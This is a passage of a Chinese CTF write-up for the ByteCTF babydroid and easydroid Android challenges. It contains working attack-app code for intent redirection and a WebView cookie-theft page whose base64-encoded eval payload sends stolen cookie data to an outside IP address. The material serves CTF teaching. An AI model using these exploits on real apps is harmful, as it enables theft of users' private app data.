+<p>当<code>Vulnerable</code>被启动时，就会找到intent的数据，我们在intent中附上我们的attack APK的Activity，同时附加上flag的contentURI。</p>
+<p>之后转到我们自己的Activity时，就可以任意读写目标应用内部文件。</p>
+<h3 id="Attack代码实现">Attack代码实现<a class="header-anchor" href="#Attack代码实现"> ¶ </a></h3>
+<h4 id="AttackAPP">AttackAPP<a class="header-anchor" href="#AttackAPP"> ¶ </a></h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断一下是否是被目标apk来start的该Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取接收到的uri</span></span><br><span class="line">        Uri data = getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义一个字符输入流</span></span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="keyword">char</span>[] buf = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">            StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取的内容输入存储到flag</span></span><br><span class="line">            String flag = <span class="keyword">new</span> String(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> String(sb));</span><br><span class="line">            <span class="comment">// 通过网络、将信息传输回来获取</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个action为&quot;evil&quot;的Intent</span></span><br><span class="line">        Intent evil = <span class="keyword">new</span> Intent(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 设定目的组件为当前MainActivity，也可以单独放在另一个AttackActivity中</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// 设置操纵data数据为 flag所在文件的contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// 添加读写权限</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建一个intent，用于启动目标APK</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 启动的目标Activity为Vulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// 同时将构造好的evil Intent当作 key &quot;intent&quot;的数据包装进去</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// 启动目标apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取到flag后设置到TextView上，同时通过<code>sendData()</code>方法使用get或post请求将数据回显到自己搭建的服务。该方法不表。</p>
+<p>同时还需要声明网络权限</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在API28+的应用默认禁止使用明文网络流量(flase)，因此还需要在<code>&lt;application&gt;</code>节点中设置属性</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:usesCleartextTraffic=&quot;true&quot;</span><br></pre></td></tr></table></figure>
+<p>需要注意一点的是attackAPP是由server.py来启动的，内定义了PackageName应为<code>&quot;com.bytectf.pwnbabydroid&quot;</code></p>
+<h4 id="本地实现">本地实现<a class="header-anchor" href="#本地实现"> ¶ </a></h4>
+<p>首先输入命令，来生成一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag ByteCTF&#123;testFlagxxxxx&#125;</span><br></pre></td></tr></table></figure>
+<p>然后安装恶意apk，运行</p>
+<p>效果图如下，可见是由Vulnerable来启动的MainActivity</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pwn2.gif" alt="pwn2"></p>
+<h2 id="easydroid">easydroid<a class="header-anchor" href="#easydroid"> ¶ </a></h2>
+<p>环境 API27_x86</p>
+<h3 id="漏洞分析-2">漏洞分析<a class="header-anchor" href="#漏洞分析-2"> ¶ </a></h3>
+<h4 id="服务源码文件server-py-2"><a target="_blank" rel="noopener" href="http://xn--server-h18il4wc39bngdo60ay2z.py">服务源码文件server.py</a><a class="header-anchor" href="#服务源码文件server-py-2"> ¶ </a></h4>
+<p>该server文件与上题的server文件大体相同</p>
+<p>修改了环境为API27</p>
+<p>修改了attackAPP和targetAPP的包名</p>
+<h4 id="apk分析-2">apk分析<a class="header-anchor" href="#apk分析-2"> ¶ </a></h4>
+<h5 id="AndroidManifest">AndroidManifest<a class="header-anchor" href="#AndroidManifest"> ¶ </a></h5>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Easydroid&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.FlagReceiver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>两个activity，一个receiver，其中只有MainActivity是可导出的。</p>
+<h5 id="FlagReceiver-2">FlagReceiver<a class="header-anchor" href="#FlagReceiver-2"> ¶ </a></h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        String flag = intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String v0_1 = Base64.encodeToString(flag.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="number">0</span>);</span><br><span class="line">                CookieManager.getInstance().setCookie(<span class="string">&quot;https://tiktok.com/&quot;</span>, <span class="string">&quot;flag=&quot;</span> + v0_1);</span><br><span class="line">                Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该文件接收intent中key为<code>&quot;flag&quot;</code>的数据value，然后将其通过<code>setCookie</code>设置到cookie文件。</p>
+<p>而cookie文件位于<code>/data/data/com.bytectf.easydroid/app_webview/Cookies</code>(API 27)文件中</p>
+<p>我们如果想要获取flag，只需要获取该Cookie文件就可以了。</p>
+<h5 id="MainActivity-2">MainActivity<a class="header-anchor" href="#MainActivity-2"> ¶ </a></h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg5);</span><br><span class="line">    Uri data = <span class="keyword">this</span>.getIntent().getData();</span><br><span class="line">    <span class="keyword">if</span>(data == <span class="keyword">null</span>) &#123;</span><br><span class="line">        data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>)) &amp;&amp; (data.getScheme().equals(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">        WebView webView = <span class="keyword">new</span> WebView(<span class="keyword">this</span>.getApplicationContext());</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView arg5, String arg6)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(Uri.parse(arg6).getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        MainActivity.<span class="keyword">this</span>.startActivity(Intent.parseUri(arg6, <span class="number">1</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span>(URISyntaxException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(arg5, arg6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.loadUrl(data.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个Activity比较重要。</p>
+<p>获取了intent，并且读取了intent携带的data数据。如果data数据为空，则 设置data为一个普通的Uri，并不执行其他操作</p>
+<p>如果<code>getAuthority()</code>得到的字符串中包括<code>&quot;toutiao.com&quot;</code>、scheme为<code>&quot;http&quot;</code>。则会使用webView来加载该链接。</p>
+<p>而<code>shouldOverrideUrlLoading()</code>方法会在WebView中每次发起跳转的时候被回调。回调的时候该方法判断scheme是否等于<code>&quot;intent&quot;</code>，如果等于<code>&quot;intent&quot;</code>，则使用<code>startActivity()</code>方法启动该intent相应的组件，该方法第二个参数flags代表着Uri被解析格式规范</p>
+<h5 id="TestActivity">TestActivity<a class="header-anchor" href="#TestActivity"> ¶ </a></h5>
+<p>该activity设置成未导出状态，我们没办法直接访问。但是该activity没有对intent进行任何校验，就直接使用WebView来加载intent携带的key为<code>&quot;url&quot;</code>的数据了。</p>
+<p>我想我们的目标就是它了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg5);</span><br><span class="line">    String url = <span class="keyword">this</span>.getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    WebView webView = <span class="keyword">new</span> WebView(<span class="keyword">this</span>.getApplicationContext());</span><br><span class="line">    <span class="keyword">this</span>.setContentView(webView);</span><br><span class="line">    webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webView.loadUrl(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用思路-2">利用思路<a class="header-anchor" href="#利用思路-2"> ¶ </a></h3>
+<p>我们的最终目标是通过TestActivity加载Cookie文件，并通过某种方式得到回显。</p>
+<h4 id="Intent重定向">Intent重定向<a class="header-anchor" href="#Intent重定向"> ¶ </a></h4>
+<p>因为MainActivity是可导出的，我们可以给MainActivity传递一个intent，同时绕过authority和scheme的验证，使其可以访问到构造好的evil网址。</p>
+<p>则需要构造一个Uri，我选择构造的为<code>&quot;http://app.toutiao.com@[evil_page]&quot;</code>，这样便可以访问到evil_page</p>
+<p>同时evil_page内通过使用<code>location.href</code>添加一个Intent的Uri。当访问时，<code>shouldOverrideUrlLoading()</code>方法就会被回调。并且解析该Uri作为intent并使用<code>startActivity()</code>来启动。</p>
+<p>我们只需让该intent携带一个<code>&quot;url&quot;</code>的数据，并且明确指向TestActivity。这样当TestActivity接收到后，就会将url来加载。</p>
+<h4 id="WebView窃取Cookies">WebView窃取Cookies<a class="header-anchor" href="#WebView窃取Cookies"> ¶ </a></h4>
+<p>我们的目标是获得Cookie文件，如果将Cookies文件的路径放到<code>&quot;url&quot;</code>的数据中，便可以将Cookies当作html解释，但只是将Cookies文件使用WebView加载还是不够，因为我们需要将Cookies文件中的内容传输回来。</p>
+<p>于是就可以在evil_page中使用<code>document.cookie=</code>设置一个cookie，然后里面填写恶意的JavaScript代码将数据发送到接收方。当将Cookie当做html解释时，恶意JavaScript代码就会执行。</p>
+<p>还有一个点是Cookies文件没有后缀名，我们还需要创建一个<code>.html</code>的符号链接来指向Cookies文件，这样才能实现WebView加载Cookies文件。</p>
+<h3 id="Attack代码实现-2">Attack代码实现<a class="header-anchor" href="#Attack代码实现-2"> ¶ </a></h3>
+<h4 id="AttackAPP-2">AttackAPP<a class="header-anchor" href="#AttackAPP-2"> ¶ </a></h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义evil_page的地址</span></span><br><span class="line">    String base = <span class="string">&quot;10.7.89.108/MyTest/evil.html&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 构造一个恶意Intent，让shouldOverrideUrlLoading回调时候使用startActivity传递该Intent</span></span><br><span class="line">        buildEvilIntent();</span><br><span class="line">        <span class="comment">// 启动搭建好的evil 网页，让目标app访问。</span></span><br><span class="line">        launch(base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildEvilIntent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Intent evil = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 设置目的组件为TestActivity</span></span><br><span class="line">        evil.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 将需要WebView加载的Cookies符号地址链接传递过去</span></span><br><span class="line">        evil.putExtra(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;file:&quot;</span>+symlink());</span><br><span class="line">        <span class="comment">// flags是转换的格式，同MainActivity为1</span></span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree-evilUri&quot;</span>,evil.toUri(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 复制该Uri，然后在evil_page中添加 跳转到该Uri的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">launch</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 构造一个intent</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 设置目的组件为MainActivity</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 构造恶意Uri，使用@突破校验</span></span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;http://www.toutiao.com@&quot;</span> + url));</span><br><span class="line">        <span class="comment">// 设置activity启动模式</span></span><br><span class="line">        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        <span class="comment">// 启动目标app的activity</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">symlink</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 获得应用数据目录</span></span><br><span class="line">        String root = getApplicationInfo().dataDir;</span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;root path:&quot;</span>+root);</span><br><span class="line">        <span class="comment">// 构造一个符号链接</span></span><br><span class="line">        String symlink = root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;symlink path:&quot;</span>+symlink);</span><br><span class="line">        String cookies = <span class="keyword">null</span>;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Cookies所在路径</span></span><br><span class="line">            cookies = getPackageManager().getApplicationInfo(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="number">0</span>).dataDir +<span class="string">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class="line">            Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;Cookies path:&quot;</span>+cookies);</span><br><span class="line">            <span class="comment">// 删除该path对应的文件，防止创建符号链接时冲突。</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;rm &quot;</span>+symlink).waitFor();</span><br><span class="line">            <span class="comment">// 创建该符号链接，使后缀名为.html。方便WebView打开</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;ln -s &quot;</span>+cookies+<span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">            <span class="comment">// 赋予应用目录最高777权限，使外部应用也可以访问该目录</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;chmod -R 777 &quot;</span>+root).waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回创建的符号链接的全路径</span></span><br><span class="line">        <span class="keyword">return</span> symlink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="evil-page">evil_page<a class="header-anchor" href="#evil-page"> ¶ </a></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>injected cookie with xss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">&quot;sendData = &#x27;&lt;img src=\&quot;evil\&quot; onerror=\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> baseUrl = <span class="string">&quot;http://10.7.89.108/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Image().src = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;open evil page.&quot;</span>);</span></span><br><span class="line"><span class="javascript">     <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">         location.href = <span class="string">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class="line"><span class="javascript">     &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span 